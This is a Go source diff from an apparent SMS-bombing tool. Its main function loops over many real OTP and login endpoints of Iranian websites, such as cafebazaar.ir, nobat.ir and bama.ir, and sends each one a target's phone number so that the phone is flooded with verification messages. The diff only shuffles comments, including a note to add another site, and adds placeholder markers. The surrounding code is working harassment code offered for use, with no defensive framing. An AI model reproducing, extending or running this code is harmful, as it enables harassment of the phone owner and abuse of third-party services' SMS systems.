@@ -107,7 +107,7 @@ func main() {
 	ch := make(chan int)
 
 	for i := 0; i < repeatCount; i++ {
-
+/////////////////////////////////////// site aparat should definitely be added.
 		go sms("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", map[string]interface{}{
 			"username": phone,
 		}, ch) // add site
@@ -205,8 +205,8 @@ func main() {
 			"mobile": phone,
 		}, ch)   // add site
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-// github account ha:
-
+// github account:
+// number 1
 		go sms("https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{
 			"------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n": phone,
 		}, ch)   // add site
@@ -270,7 +270,22 @@ func main() {
 		go sms("https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{
 			"mobile_phone": phone,
 		}, ch) 
+//number2:
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+		
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
@@ -304,7 +319,6 @@ func main() {
  		go sms("https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
-/////////////////////////////////////// site aparat should definitely be added.
 		go sms("https://account.bama.ir/api/otp/generate/v4", map[string]interface{}{
 			"username": phone,
 		}, ch)  // edit :4/22/2025
